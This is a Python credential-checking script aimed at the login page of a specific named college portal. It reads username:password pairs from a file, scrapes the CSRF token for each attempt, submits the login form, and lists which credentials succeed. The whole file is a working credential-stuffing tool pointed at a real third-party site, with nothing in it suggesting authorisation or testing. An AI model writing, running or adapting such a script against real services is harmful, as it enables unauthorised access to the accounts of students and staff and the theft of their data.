import requests
import re
import time

def get_csrf_token(session):
    response = session.get('https://rajukcollege.edutechbd.online/login/', headers={
        'Cache-Control': 'max-age=0',
        'Referer': 'https://rajukcollege.edutechbd.online/login/',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
    })
    
    match = re.search(r'<input type="hidden" name="csrfmiddlewaretoken" value="([^"]+)"', response.text)
    if match:
        return match.group(1)
    return None

def attempt_login(session, username, password, csrf_token):
    login_data = {
        'csrfmiddlewaretoken': csrf_token,
        'username': username,
        'password': password,
    }
    
    response = session.post('https://rajukcollege.edutechbd.online/login/', 
                           headers={
                               'Cache-Control': 'max-age=0',
                               'Content-Type': 'application/x-www-form-urlencoded',
                               'Origin': 'https://rajukcollege.edutechbd.online',
                               'Referer': 'https://rajukcollege.edutechbd.online/login/?next=/',
                               'Sec-Fetch-Dest': 'document',
                               'Sec-Fetch-Mode': 'navigate',
                               'Sec-Fetch-Site': 'same-origin',
                               'Sec-Fetch-User': '?1',
                           }, 
                           data=login_data)
    
    return response

def main():
    try:
        with open('user.txt', 'r') as file:
            lines = file.readlines()
    except FileNotFoundError:
        print("Error: user.txt file not found!")
        return
    
    if not lines:
        print("Error: user.txt is empty!")
        return
    
    print(f"Found {len(lines)} credential(s) to check...")
    print("=" * 50)
    
    valid_credentials = []
    invalid_count = 0
    
    for i, line in enumerate(lines, 1):
        line = line.strip()
        if not line:
            continue
            
        try:
            username, password = line.split(':', 1)
        except ValueError:
            print(f"Line {i}: Invalid format - Expected username:password")
            continue
        
        session = requests.session()
        
        csrf_token = get_csrf_token(session)
        if not csrf_token:
            print(f"Line {i}: Failed to get CSRF token")
            continue
        
        print(f"Testing [{i}/{len(lines)}] Username: {username}")
        
        response = attempt_login(session, username, password, csrf_token)
        
        if "Invalid Username or Password!" in response.text:
            print(f"❌ INVALID - {username}:{password}")
            invalid_count += 1
        else:
            print(f"✅ SUCCESS - {username}:{password}")
            valid_credentials.append(f"{username}:{password}")
        
        print("-" * 30)
        
        time.sleep(1)
    
    print("=" * 50)
    print("FINAL SUMMARY:")
    print(f"Total tested: {len([l for l in lines if l.strip()])}")
    print(f"Valid credentials: {len(valid_credentials)}")
    print(f"Invalid credentials: {invalid_count}")
    
    if valid_credentials:
        print("\n✅ VALID CREDENTIALS FOUND:")
        for cred in valid_credentials:
            print(f"  {cred}")
    else:
        print("\n❌ No valid credentials found.")

if __name__ == "__main__":
    main()
